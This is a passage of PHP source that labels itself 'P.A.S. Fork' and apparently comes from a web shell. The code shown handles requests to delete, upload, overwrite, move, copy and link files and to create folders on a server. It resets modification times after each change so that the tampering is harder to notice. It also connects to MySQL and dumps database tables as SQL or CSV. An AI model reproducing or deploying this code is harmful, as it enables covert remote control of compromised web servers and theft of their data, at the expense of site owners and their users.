            header('Content-Type: application/json; charset=' . CSE);
            sDie('0');
        }
        if (isset($D['u'])) {
            echo '{';
            $a = array();
            $e = array();
            $b = FALSE;
            $k = NULL;
            sort($D['u']);
            foreach ($D['u'] as $v) {
                parsePath($v, $p, $n);
                if (!isset($a[$p])) {
                    $t = new FileInfo($p);
                    $t = $t->getMTime();
                } else
                    $t = FALSE;
                if (delFOD($v)) {
                    if ($t)
                        $a[$p] = $t;
                    if (!$b) {
                        echo '"r":[';
                        $b = TRUE;
                    }
                    if ($p !== $k) {
                        if ($k !== NULL)
                            echo ']},';
                        echo '{"p":';
                        jsonEcho($p);
                        echo ',"f":[';
                        $k = $p;
                    } else
                        echo ',';
                    jsonEcho($n);
                } else
                    $e[] = $v;
            }
            if ($b)
                echo ']}]';
            if ($e) {
                if ($b)
                    echo ',';
                echo '"e":[';
                foreach ($e as $k => $v) {
                    if ($k > 0)
                        echo ',';
                    jsonEcho($v);
                }
                echo ']';
            }
            foreach ($a as $k => $v)
                touch($k, $v);
            sDie('}');
        }
        if (!empty($_FILES['f']) || !empty($_REQUEST['f'])) {
			
			if(is_array($_REQUEST['f']) && !isset($_FILES['f'])){
				foreach ($_REQUEST['f'] as $k => $v) {
					$_FILES['f']['name'][$k] = basename(key($v));
					$_FILES['f']['tmp_name'][$k] = $v[$_FILES['f']['name'][$k]];
					$_FILES['f']['error'][$k] = 0;
				}
			}
			
		    echo '{';
		    $a = array();
		    $b = FALSE;
		    $i = new FileInfo($D['p']);
		    $i = $i->getMTime();
		    foreach ($_FILES['f']['error'] as $k => $v) {
		        $n = $_FILES['f']['name'][$k];
		        if ($v === 0) {
		            $p = $D['p'] . $n;
		            $t = $_FILES['f']['tmp_name'][$k];
		            if (move_uploaded_file($t, $p) || rename($t, $p) || copy($t, $p) || link($t, $p) || (is_string($c = getFile($t)) && writeFile($p, $c))) {
		                $a[] = $n;
		                if ($i)
		                    touch($p, $i);
		                continue;
		            }
		        }
		        if ($b)
		            echo ',';
		        else {
		            $b = TRUE;
		            echo '"e":[';
		        }
		        jsonEcho($v . $n);
		    }
		    if ($b)
		        echo ']';
		    if (count($a) > 0) {
		        if ($i) {
		            touch($D['p'], $i);
		            clearstatcache();
		        }
		        if ($b)
		            echo ',';
		        echo '"p":';
		        jsonEcho($D['p']);
		        echo ',"f":[';
		        foreach ($a as $v)
		            outFileInfo($D['p'] . $v);
		        echo ']';
		        outFileInfo(NULL, TRUE);
		    }
		    sDie('}');
		}
        if (isset($D['w'])) {
            $a = array();
            if (is_file($D['w']) || file_exists($D['w'])) {
                $i = new FileInfo($D['w']);
                if ($i->isDir())
                    sDie('{"e":"(path already exists as directory)"}');
            } else {
                $p     = filePath($D['w']);
                $i     = new FileInfo($p);
                $a[$p] = $i->getMTime();
            }
            $a[$D['w']] = $i->getMTime();
            switch ($D['e']) {
                case 0:
                    $v = "\r\n";
                    break;
                case 1:
                    $v = "\n";
                    break;
                case 2:
                    $v = "\r";
                    break;
            }
            $D['t'] = strtr($D['t'], array(
                "\r\n" => $v,
                "\r" => $v,
                "\n" => $v
            ));
            if (writeFile($D['w'], $D['t'])) {
				
				if(function_exists('opcache_invalidate')) opcache_invalidate($D['w'], true);
				
                foreach ($a as $k => $v)
                    if ($v)
                        touch($k, $v);
                clearstatcache();
                $i = new FileInfo($D['w']);
                echo "\x01\x02";
                $b = outFile($D['w']);
                echo "\x03\x1E";
                if ($b) {
                    echo "\x06";
                    jsonFileInfo($i, TRUE);
                } else
                    echo "\x15", $D['w'];
                sDie("\x17\x04\x10");
            }
            sDie('{"e":""}');
        }
        if (isset($D['l'])) {
            $p = filePath($D['l']);
            $t = new FileInfo($p);
            $t = $t->getMTime();
            if ($D['t'] == 0 ? symlink($D['p'], $D['l']) : link($D['p'], $D['l'])) {
                if ($t) {
                    if ($D['t'] != 0)
                        touch($D['l'], $t);
                    touch($p, $t);
                    clearstatcache();
                }
                jsonFileInfo(new FileInfo($D['l']), TRUE);
                sDie();
            }
            sDie('{"e":""}');
        }
        if (isset($D['m'])) {
            if (is_file($D['m']) || is_dir($D['m']) || file_exists($D['m']))
                sDie('{"e":"(path already exists)"}');
            $p = filePath($D['m']);
            $i = new FileInfo($p);
            $i = $i->getMTime();
            if (mkdir($D['m'], 0755)) {
                if ($i) {
                    touch($D['m'], $i);
                    touch($p, $i);
                    clearstatcache();
                }
                jsonFileInfo(new FileInfo($D['m']), TRUE);
                sDie();
            }
            sDie('{"e":""}');
        }
        if (isset($D['f'])) {
            echo '{';
            $a = array();
            $m = array();
            $c = array();
            $b = FALSE;
            $t = new FileInfo($D['f']);
            $t = $t->getMTime();
            if (isset($D['v']))
                foreach ($D['v'] as $v) {
                    $i = new FileInfo($v);
                    $j = $i->getMTime();
                    $f = $D['f'] . $i->getFileName();
                    $s = $i->getPath();
                    if (!isset($a[$s])) {
                        $n = new FileInfo($s);
                        $n = $n->getMTime();
                    } else
                        $n = FALSE;
                    if (rename($v, $f)) {
                        if ($n)
                            $a[$s] = $n;
                        if ($j)
                            $a[$f] = $j;
                        $m[$s][] = $i->getFileName();
                    } else {
                        if ($b)
                            echo ',';
                        else {
                            echo '"e":[';
                            $b = TRUE;
                        }
                        jsonEcho($v);
                    }
                }
            if (isset($D['p']))
                foreach ($D['p'] as $v) {
                    $i = new FileInfo($v);
                    $f = $D['f'] . $i->getFileName();
                    if (copy($v, $f) || link($v, $f) || (!$i->isDir() && is_string($s = getFile($v)) && writeFile($f, $s))) {
                        $v = $i->getMTime();
                        if ($v)
                            $a[$f] = $v;
                        $c[] = $i->getFileName();
                    } else {
                        if ($b)
                            echo ',';
                        else {
                            echo '"e":[';
                            $b = TRUE;
                        }
                        jsonEcho($v);
                    }
                }
            if ($b)
                echo ']';
            if (count($m) > 0 || count($c) > 0) {
                foreach ($a as $k => $v)
                    touch($k, $v);
                if ($t)
                    touch($D['f'], $t);
                clearstatcache();
                if ($b)
                    echo ',';
                echo '"p":';
                jsonEcho($D['f']);
                if (count($m) > 0) {
                    echo ',"m":[';
                    $b = FALSE;
                    foreach ($m as $k => $a) {
                        if ($b)
                            echo ',';
                        else
                            $b = TRUE;
                        echo '{"p":';
                        jsonEcho($k);
                        outFileInfo(NULL, FALSE);
                        echo ',"f":[';
                        foreach ($a as $v)
                            outFileInfo($D['f'] . $v);
                        echo ']}';
                    }
                    echo ']';
                }
                if (count($c) > 0) {
                    echo ',"c":[';
                    $b = FALSE;
                    foreach ($c as $v)
                        outFileInfo($D['f'] . $v);
                    echo ']';
                }
                outFileInfo(NULL, TRUE);
            }
            sDie('}');
        }
        break;
    case 's':
        define('T_DMPHDR', "-- \n-- This SQL dump created by P.A.S. Fork v." . VER . "\n-- \n-- Started at %s UTC\n");
        define('T_DMPFTR', "-- Finished at %s UTC");
        define('E_SLCTDT', "Can't load data from table %s\n");
        define('E_CNSTCS', "Can't construct create statement for table %s\n");
        define('E_CHNGDB', "Can't change database to %s for dump table %s.%s\n");
        class SQLBase {
            var $_cnct, $_res;
            function connError($m, $h, $u, $p, $b) {
                echo '{"e":';
                jsonEcho($m ? $m : "Can't connect to SQL server" . ($h === NULL ? '' : ' ' . $h) . ($u === NULL ? '' : ' as user "' . $u . '"') . ($p === NULL ? '' : ' with password "' . $p . '"') . ($b === NULL ? '' : ' and select database "' . $b . '"') . '.');
                sDie('}');
            }
            function getError() {
                $v = $this->_cnct->errorInfo();
                return $v[2];
            }
            function tryQueries($a) {
                $i = $this->_cnct;
                foreach ($a as $v)
                    if ($this->_res = $i->query($v))
                        return TRUE;
                return FALSE;
            }
            function fetchAssoc() {
                return $this->_res->fetch(PDO::FETCH_ASSOC);
            }
            function fetchRow() {
                return $this->_res->fetch(PDO::FETCH_NUM);
            }
            function query($v) {
                return ($this->_res = $this->_cnct->query($v));
            }
            function fetchBase() {
                return $this->_res->fetchColumn(0);
            }
            function fetchTable() {
                return $this->_res->fetchColumn(0);
            }
            function getColumnsNames($v) {
                $a = array();
                if (($v = $this->_cnct->query('SELECT * FROM ' . $v . ' LIMIT 1')) && ($v = $v->fetch(PDO::FETCH_ASSOC))) {
                    foreach ($v as $k => $i)
                        $a[$k] = '';
                    return $a;
                }
                return FALSE;
            }
            function sqlTableSize($v) {
                return ($v = $this->_cnct->query('SELECT COUNT(*) FROM ' . $v)) ? $v->fetchColumn(0) : '"?"';
            }
            function close() {
                $this->_cnct = NULL;
            }
        }
        function sqlJoinColumns($a, $f) {
            if ($a) {
                foreach ($a as $k => $v)
                    $a[$k] = $f($v);
                return implode(',', $a);
            }
            return '*';
        }
        function sqlOutCreate($t, $c, $d, $f) {
            echo "\nCREATE TABLE ", $f($t), " (\n";
            $b = FALSE;
            foreach ($c as $k => $v) {
                if ($b)
                    echo ",\n";
                else
                    $b = TRUE;
                echo '  ', $f($k), ' ', $v ? $v : $d;
            }
            echo "\n);\n";
        }
        function sqlOutInsert($t, $c) {
            echo "\nINSERT INTO ", $t;
            if ($c !== '*')
                echo ' (', $c, ')';
            echo ' VALUES';
        }
        function sqlOutValues($a, $f) {
            echo "\n(";
            $b = FALSE;
            foreach ($a as $v) {
                if ($b)
                    echo ',';
                else
                    $b = TRUE;
                if ($v === NULL)
                    echo 'NULL';
                else
                    echo $f($v);
            }
            echo ')';
        }
        function csvOutValues($a) {
            $c = 0;
            $b = FALSE;
            foreach ($a as $v) {
                if ($b)
                    echo ';';
                else
                    $b = TRUE;
                if ($v === NULL)
                    echo '\N';
                else {
                    $v = str_replace(array(
                        '"',
                        ';',
                        "\r",
                        "\n"
                    ), array(
                        '""',
                        ';',
                        '\r',
                        '\n'
                    ), $v, $c);
                    echo $c > 0 ? '"' . $v . '"' : $v;
                }
            }
        }
        function mysqlEscData($v) {
            return "'" . str_replace(array(
                '\\',
                "'",
                '"',
                "\0",
                "\n",
                "\r",
                "\x1A"
            ), array(
                '\\\\',
                "\\'",
                '\\"',
                '\\0',
                '\\n',
                '\\r',
                '\\Z'
            ), $v) . "'";
        }
        function mysqlEscName() {
            $a = func_get_args();
            foreach ($a as $k => $v)
                $a[$k] = '`' . str_replace('`', '``', $v) . '`';
            return implode('.', $a);
        }
        class MySQLBase extends SQLBase {
            var $haveSchemas = FALSE, $canPaginate = TRUE;
            function charset($k) {
                $v = array(
                    'utf8',
                    'utf16',
                    'cp1250',
                    'cp1251',
                    'latin1',
                    'latin5',
                    'cp1256',
                    'cp1257',
                    'latin1',
                    'latin2',
                    'greek',
                    'hebrew',
                    'latin5',
                    'latin7',
                    'big5',
                    'gbk',
                    'sjis',
                    'euckr',
                    'ujis',
                    'cp866',
                    'koi8r',
                    'koi8u'
                );
                return isset($v[$k]) ? $v[$k] : 'utf8';
            }
            function parseCrtTbl($v) {
                $a = array();
                $n = '`((?:[^`]|``)+)`';
                $l = ' \(((?:`(?:[^`]|``)+`,?)+)\)';
                $t = '(?: USING (?:BTREE|HASH))?';
                $c = '(?:\s+CONSTRAINT(?: `(?:[^`]|``)+)`)?\s+';
                $e = '(`(?:[^`]|``)+`)';
                preg_match_all('#^\s+' . $n . ' ([a-z]+)((?:\(| ).+)?,?$#Um', $v, $m);
                foreach ($m[1] as $k => $i)
                    $a[$i] = strtoupper($m[2][$k]) . $m[3][$k];
                if (preg_match('#^' . $c . 'PRIMARY KEY' . $t . $l . '.*$#Um', $v, $m)) {
                    preg_match_all('#' . $n . '#', $m[1], $m);
                    foreach ($m[1] as $i)
                        $a[$i] .= ', PRIMARY KEY';
                }
                if (preg_match_all('#^\s+(?:INDEX|KEY)(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', KEY' . $k;
                    }
                if (preg_match_all('#^' . $c . 'UNIQUE(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', UNIQUE KEY' . $k;
                    }
                if (preg_match_all('#^\s+(?:FULLTEXT|SPATIAL)(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', FULLTEXT KEY' . $k;
                    }
                if (preg_match_all('#^' . $c . 'FOREIGN KEY(?: ' . $e . ')?' . $l . ' REFERENCES (`(?:[^`]|``)+` \((?:`(?:[^`]|``)+`,?)+\)).*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        $k .= ' ' . $m[3][$i];
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', FOREIGN KEY' . $k;
                    }
                return $a;
            }
            function prepType($v) {
                $s = ($i = strpos($v[1], '(')) ? strtoupper(substr($v[1], 0, $i)) . substr($v[1], $i) : strtoupper($v[1]);
                if ($v[2] === 'NO')
                    $s .= ' NOT NULL';
                if ($v[4] !== NULL)
                    $s .= ' DEFAULT ' . mysqlEscData($v[4]);
                if ($v[5] !== NULL)
                    $s .= ' ' . strtoupper($v[5]);
                switch ($v[3]) {
                    case 'PRI':
                        $s .= ' PRIMARY KEY';
                        break;
                    case 'UNI':
                        $s .= ' UNIQUE KEY';
                        break;
                    case 'MUL':
                        $s .= ', KEY(' . mysqlEscName($v[0]) . ')';
                        break;
                }
                return $s;
            }
            function getBases() {
                return $this->tryQueries(array(
                    'SHOW DATABASES',
                    'SHOW SCHEMAS',
                    'SELECT schema_name FROM information_schema.schemata',
                    'SELECT DISTINCT table_schema FROM information_schema.tables',
                    'SELECT DISTINCT table_schema FROM information_schema.columns'
                ));
            }
            function getTables($b) {
                $v = mysqlEscData($b);
                return $this->tryQueries(array(
                    'SHOW TABLES FROM ' . mysqlEscName($b),
                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $v,
                    'SELECT DISTINCT table_name FROM information_schema.columns WHERE table_schema=' . $v
                ));
            }
            function getColumns($b, $t) {
                $a = array();
                $e = mysqlEscName($b, $t);
                if ($this->tryQueries(array(
                    'SHOW COLUMNS FROM ' . $e,
                    'SHOW FIELDS FROM ' . $e,
                    'DESC ' . $e,
                    'DESCRIBE ' . $e,
                    'SELECT column_name,column_type,is_nullable,column_key,column_default,extra FROM information_schema.columns WHERE table_name=' . mysqlEscData($t) . ' AND table_schema=' . mysqlEscData($b)
                ))) {
                    while ($v = $this->fetchRow())
                        $a[$v[0]] = $this->prepType($v);
                    return $a;
                }
                if ($this->query('SHOW CREATE TABLE ' . $e) && ($v = $this->fetchRow()))
                    return $this->parseCrtTbl($v[1]);
                return $a;
            }
            function select($b, $t, $c, $o, $l) {
                return $this->query('SELECT ' . sqlJoinColumns($c, 'mysqlEscName') . ' FROM ' . mysqlEscName($b, $t) . ' LIMIT ' . $o . ',' . $l);
            }
            function outCreateTable($b, $t) {
                if ($this->query('SHOW CREATE TABLE ' . mysqlEscName($b, $t)) && ($v = $this->fetchRow())) {
                    echo "\n", $v[1], ";\n";
                    return '';
                }
                if ($v = $this->getColumns($b, $t)) {
                    sqlOutCreate($t, $v, 'BLOB', 'mysqlEscName');
                    return '';
                }
                return sprintf(E_CNSTCS, $b . '.' . $t);
            }
        }
        class MySQLClient extends MySQLBase {
            function connect($h, $u, $p, $b, $c) {
                if (!($this->_cnct = mysql_connect($h, $u, $p)))
                    return FALSE;
                mysql_query('SET NAMES ' . $this->charset($c), $this->_cnct);
                if ($b !== NULL && !mysql_select_db($b, $this->_cnct))
                    return mysql_query('USE ' . mysqlEscName($b), $this->_cnct);
                return TRUE;
            }
            function getError() {
                if ($this->_cnct) {
                    $v = mysql_error($this->_cnct);
                    mysql_close($this->_cnct);
                    return $v;
                }
                return mysql_error();
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = mysql_query($v, $this->_cnct))
                        return TRUE;
                return FALSE;
            }
            function getBases() {
                return (($this->_res = mysql_list_dbs($this->_cnct)) || parent::getBases());
            }
            function fetchBase() {
                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function fetchTable() {
                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function getTables($b) {
                return (($this->_res = mysql_list_tables($b, $this->_cnct)) || parent::getTables($b));
            }
            function getTableSize($b, $t) {
                return ($v = mysql_query('SELECT COUNT(*) FROM ' . mysqlEscName($b, $t), $this->_cnct)) ? mysql_result($v, 0) : '"?"';
            }
            function getColumns($b, $t) {
                if ($a = parent::getColumns($b, $t))
                    return $a;
                $e = mysqlEscName($b, $t);
                $q = FALSE;
                if (($q = mysql_list_fields($b, $t, $this->_cnct)) || ($q = mysql_query('SELECT * FROM ' . $e . ' LIMIT 0', $this->_cnct))) {
                    if ($v = mysql_fetch_field($q)) {
                        do {
                            $s = $v->type === 'string' ? 'TEXT' : strtoupper($v->type);
                            if ($v->unsigned)
                                $s .= ' UNSIGNED';
                            if ($v->zerofill)
                                $s .= ' ZEROFILL';
                            if ($v->not_null)
                                $s .= ' NOT NULL';
                            if (isset($v->def) && $v->def !== '' && $v->def !== NULL)
                                $s .= ' DEFAULT ' . mysqlEscData($v->def);
                            if ($v->primary_key)
                                $s .= ' PRIMARY KEY';
                            elseif ($v->unique_key)
                                $s .= ' UNIQUE KEY';
                            elseif ($v->multiple_key)
                                $s .= ', KEY(' . mysqlEscName($v->name) . ')';
                            $a[$v->name] = $s;
                        } while ($v = mysql_fetch_field($q));
                        return $a;
                    }
                    if (is_string($v = mysql_field_name($q, 0))) {
                        $i = 0;
                        do {
                            if (is_string($s = mysql_field_type($q, $i)))
                                $a[$v] = $s === 'string' ? 'TEXT' : strtoupper($s);
                            if (($a[$v] === 'INT' || $a[$v] === 'REAL') && ($s = mysql_field_len($q, $i)))
                                $a[$v] .= '(' . $s . ')';
                            if (is_string($s = mysql_field_flags($q, $i))) {
                                if (strpos($s, 'unsigned') !== FALSE)
                                    $a[$v] .= ' UNSIGNED';
                                if (strpos($s, 'zerofill') !== FALSE)
                                    $a[$v] .= ' ZEROFILL';
                                if (strpos($s, 'not_null') !== FALSE)
                                    $a[$v] .= ' NOT NULL';
                                if (strpos($s, 'auto_increment') !== FALSE)
                                    $a[$v] .= ' AUTO_INCREMENT';
                                if (strpos($s, 'primary_key') !== FALSE)
                                    $a[$v] .= ' PRIMARY KEY';
                                elseif (strpos($s, 'unique_key') !== FALSE)
                                    $a[$v] .= ' UNIQUE KEY';
                                elseif (strpos($s, 'multiple_key') !== FALSE)
                                    $a[$v] .= ', KEY(' . mysqlEscName($v) . ')';
                            }
                        } while (is_string($v = mysql_field_name($q, ++$i)));
                        return $a;
                    }
                }
                if (($v = mysql_query('SELECT * FROM ' . $e . ' LIMIT 1', $this->_cnct)) && ($v = mysql_fetch_assoc($v))) {
                    foreach ($v as $k => $s)
                        $a[$k] = '';
                    return $a;
                }
                return FALSE;
            }
            function fetchAssoc() {
                return mysql_fetch_assoc($this->_res);
            }
            function fetchRow() {
                return mysql_fetch_row($this->_res);
            }
            function query($v) {
                return ($this->_res = mysql_query($v, $this->_cnct));
            }
            function dump($b, $t, $c, $f) {
                if ($f)
                    $i = $this->outCreateTable($b, $t);
                $c = sqlJoinColumns($c, 'mysqlEscName');
                if (($q = mysql_unbuffered_query('SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), $this->_cnct)) && ($v = mysql_fetch_assoc($q))) {
                    if ($f)
                        sqlOutInsert(mysqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        if ($d)
                            echo $d;
                        else
                            $d = $f ? ',' : "\n";
                        if ($f)
                            sqlOutValues($v, 'mysqlEscData');
                        else
                            csvOutValues($v);
                    } while ($v = mysql_fetch_row($q));
                    if ($f)
                        echo ";\n";
                    mysql_free_result($q);
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
                return $i;
            }
            function close() {
                mysql_close($this->_cnct);
            }
        }
        class MySQLiClient extends MySQLBase {
            function connect($h, $u, $p, $b, $c) {
                if ($h !== NULL && ($v = strrpos($h, ':'))) {
                    $t = (int) substr($h, $v + 1);
                    $h = substr($h, 0, $v);
                } else
                    $t = NULL;
                if (!($this->_cnct = mysqli_connect($h, $u, $p, $b, $t)))
                    return FALSE;
                mysqli_query($this->_cnct, 'SET NAMES ' . $this->charset($c));
                return TRUE;
            }
            function getError() {
                if ($this->_cnct) {
                    $v = mysqli_error($this->_cnct);
                    mysqli_close($this->_cnct);
                    return $v;
                }
                return mysqli_connect_error();
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = mysqli_query($this->_cnct, $v))
                        return TRUE;
                return FALSE;
            }
            function fetchBase() {
                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function fetchTable() {
                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function getTableSize($b, $t) {
                if ($v = mysqli_query($this->_cnct, 'SELECT COUNT(*) FROM ' . mysqlEscName($b, $t))) {
                    $v = mysqli_fetch_row($v);
                    return $v[0];
                }
                return '"?"';
            }
            function getColumns($b, $t) {
                if ($a = parent::getColumns($b, $t))
                    return $a;
                $e = mysqlEscName($b, $t);
                $q = FALSE;
                if ($q = mysqli_query($this->_cnct, 'SELECT * FROM ' . $e . ' LIMIT 1')) {
                    $y = array(
                        'DECIMAL',
                        'TINYINT',
                        'SMALLINT',
                        'INT',
                        'FLOAT',
                        'DOUBLE',
                        'NULL',
                        'TIMESTAMP',
                        'BIGINT',
                        'MEDIUMINT',
                        'DATE',
                        'TIME',
                        'DATETIME',
                        'YEAR',
                        'NEWDATE',
                        16 => 'BIT',
                        246 => 'DECIMAL',
                        247 => 'ENUM',
                        248 => 'SET',
                        249 => 'TINY',
                        250 => 'MEDIUM',
                        251 => 'LONG',
                        252 => '',
                        253 => 'VARCHAR',
                        254 => 'CHAR',
                        255 => 'GEOMETRY'
                    );
                    if (!($v = mysqli_fetch_fields($q)) && ($i = mysqli_fetch_field($q))) {
                        $v = array();
                        do {
                            $v[] = $i;
                        } while ($i = mysqli_fetch_field($q));
                    }
                    if ($v) {
                        foreach ($v as $i) {
                            if ($i->type > 248 && $i->type < 253)
                                $s = $y[$i->type] . (($i->flags & 16) ? 'BLOB' : 'TEXT');
                            else
                                $s = isset($y[$i->type]) ? $y[$i->type] : 'BLOB';
                            if ($i->flags & 32768) {
                                $s .= '(' . $i->length;
                                if ($i->decimals)
                                    $s .= ',' . $i->decimals;
                                $s .= ')';
                            }
                            if ($i->flags & 32)
                                $s .= ' UNSIGNED';
                            if ($i->flags & 64)
                                $s .= ' ZEROFILL';
                            if ($i->flags & 1)
                                $s .= ' NOT NULL';
                            if (isset($i->def) && $i->def !== '' && $i->def !== NULL)
                                $s .= ' DEFAULT ' . mysqlEscData($i->def);
                            if ($i->flags & 512)
                                $s .= ' AUTO_INCREMENT';
                            if ($i->flags & 2)
                                $s .= ' PRIMARY KEY';
                            elseif (($i->flags & 4) || ($i->flags & 65536))
                                $s .= ' UNIQUE KEY';
                            elseif (($i->flags & 8) || ($i->flags & 16384))
                                $s .= ', KEY(' . mysqlEscName($i->name) . ')';
                            $a[$i->name] = $s;
                        }
                        return $a;
                    }
                    if ($v = mysqli_fetch_assoc($q)) {
                        foreach ($v as $k => $i)
                            $a[$k] = '';
                        return $a;
                    }
                }
                return FALSE;
            }
            function fetchAssoc() {
                return mysqli_fetch_assoc($this->_res);
            }
            function fetchRow() {
                return mysqli_fetch_row($this->_res);
            }
            function query($v) {
                return ($this->_res = mysqli_query($this->_cnct, $v));
            }
            function dump($b, $t, $c, $f) {
                if ($f)
                    $i = $this->outCreateTable($b, $t);
                $c = sqlJoinColumns($c, 'mysqlEscName');
                if (($q = mysqli_query($this->_cnct, 'SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), MYSQLI_USE_RESULT)) && ($v = mysqli_fetch_assoc($q))) {
                    if ($f)
                        sqlOutInsert(mysqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        if ($d)
                            echo $d;
                        else
                            $d = $f ? ',' : "\n";
                        if ($f)
                            sqlOutValues($v, 'mysqlEscData');
          
